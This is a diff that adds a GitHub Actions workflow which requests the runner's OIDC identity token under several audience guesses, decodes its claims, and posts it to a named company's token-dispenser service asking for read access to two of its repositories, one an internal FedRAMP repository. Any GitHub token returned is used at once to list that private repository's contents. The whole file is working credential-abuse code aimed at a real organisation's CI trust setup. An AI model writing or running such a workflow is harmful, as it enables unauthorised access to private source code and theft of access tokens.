@@ -1,0 +1,32 @@
+name: oidc
+on: [workflow_dispatch, push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  t:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          set +x
+          DISP=https://gha-token-dispenser.flocksafety.com/api/token
+          for aud in "" "https://gha-token-dispenser.flocksafety.com" "api://gha-token-dispenser.flocksafety.com" "gha-token-dispenser.flocksafety.com" "flocksafety"; do
+            u="${ACTIONS_ID_TOKEN_REQUEST_URL}${aud}"
+            tok=$(curl -s "$u" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
+            echo "=====AUD=[$aud] toklen=${#tok}"
+            if [ "${#tok}" -lt 50 ]; then echo "tok-fetch-fail"; continue; fi
+            echo "$tok" | cut -d. -f2 | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,ref,repository,actor}'
+            for body in "{\"repo\":\"flocksafety/gg\",\"permissions\":\"contents: read\"}" "{\"repo\":\"flocksafety/flock-core-fedramp20x-internal\",\"permissions\":\"contents: read\"}"; do
+              echo "--- POST $body"
+              resp=$(curl -s -X POST "$DISP" -H 'Content-Type: application/json' -d "{\"token\":\"$tok\",$body")
+              resp="${resp}{\"token\":\"$tok\",$body}"
+              resp=$(curl -s -X POST "$DISP" -H 'Content-Type: application/json' -d "{\"token\":\"$tok\",${body%\}}}")
+              echo "$resp" | head -c 300; echo
+              gtok=$(echo "$resp" | jq -r '.token // .access_token // empty' 2>/dev/null)
+              if [ -n "$gtok" ] && [ "${#gtok}" -gt 20 ]; then
+                echo "GOT-GITHUB-TOKEN len=${#gtok} prefix=${gtok:0:7}"
+                echo "--- using token on internal repo contents:"
+                curl -s -H "Authorization: Bearer $gtok" https://api.github.com/repos/flocksafety/flock-core-fedramp20x-internal/contents | head -c 900; echo
+              fi
+            done
+          done
